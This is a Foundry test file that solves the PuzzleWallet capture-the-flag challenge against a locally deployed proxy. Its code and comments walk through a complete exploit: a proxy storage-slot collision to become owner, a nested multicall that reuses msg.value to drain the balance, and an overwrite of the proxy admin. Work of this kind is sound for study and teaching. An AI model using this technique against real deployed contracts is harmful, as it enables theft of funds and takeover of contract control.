pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuzzleWallet.sol";

contract AttackPuzzleWallet is Test {
    PuzzleWallet public target;
    PuzzleWallet public impl;
    PuzzleProxy public proxy;
    address public hombre = address(0x69);

    function setUp() public {
        // deploy the PuzzleWallet logic
        impl = new PuzzleWallet();

        // deploy proxy and initialize implementation contract
        bytes memory data = abi.encodeWithSelector(PuzzleWallet.init.selector, 100 ether);
        proxy = new PuzzleProxy(address(this), address(impl), data);
        target = PuzzleWallet(address(proxy));

        // whitelist this contract to allow it to deposit ETH
        target.addToWhitelist(address(this));
        target.deposit{value: 0.001 ether}();

        vm.deal(hombre, 1 ether);
    }

    modifier asAttacker {
      vm.startPrank(hombre);
      _;
      vm.stopPrank();
    }

    function testSolidityPuzzleWallet() public asAttacker {
      // almost certainly the issue here is that the admin is in the storage slot
      // if we change the owner, we change the admin via delegatecall
      // actually this is Audius round 2
      // so we need to set maxBalance to zero, then delegatecall to owner, then we are the admin

      // recall how delegatecall works:
      // When contract A executes delegatecall to contract B, B's code is executed
      // with contract A's storage, msg.sender and msg.value.
      // so our storage looks like
      //                Wallet                 |                     Proxy
      //                owner                                        pendingAdmin
      //                maxBalance                                   admin

      // call the proxy to propose a new owner (me)
      proxy.proposeNewAdmin(hombre);
      
      // this unlocks add to whitelist as we are now the owner
      target.addToWhitelist(hombre);

      // now we want to reset max balance but we can't until the balance is zero. 
      // what we need to do is brick the contract's accounting by re-using the existing
      // msg.value with a reentrancy

      // we're going to make 3 calls
      bytes[] memory outerCalls = new bytes[](3);
      bytes memory deposit = abi.encodeCall(target.deposit, ());

      // first is a standard deposit, this will delegatecall as the msg.sender (the attacker)
      // and set my balance equal to the initial deposit
      outerCalls[0] = deposit;

      // next we're going to repeat the deposit, but this time we will reenter the multicall
      // but within a new execution context where `depositCalled` is still false
      // basically here, we are still able to use delegatecall to use our own sender, msg.value
      // but we are abusing the fact that function variables are unique to their own execution context
      bytes[] memory innerCalls = new bytes[](1);
      innerCalls[0] = deposit;

      // set the next call to deposit via multicall
      outerCalls[1] = abi.encodeCall(target.multicall, (innerCalls));

      // get the current value in the contract
      uint value = address(target).balance;

      // final call is to transfer out the balance of the contract to the attacker
      outerCalls[2] = abi.encodeCall(target.execute, (hombre, value * 2, bytes("")));

      // execute the outer multicall
      target.multicall{value: value}(outerCalls);

      // balance of the contract is zero, so we can set Max balance to my address
      // which due to how proxies work will overwrite the admin in the proxy contract
      target.setMaxBalance(uint(uint160(hombre)));

      // attacker is now admin on the proxy
      assertEq(proxy.admin(), hombre);
    }

  }
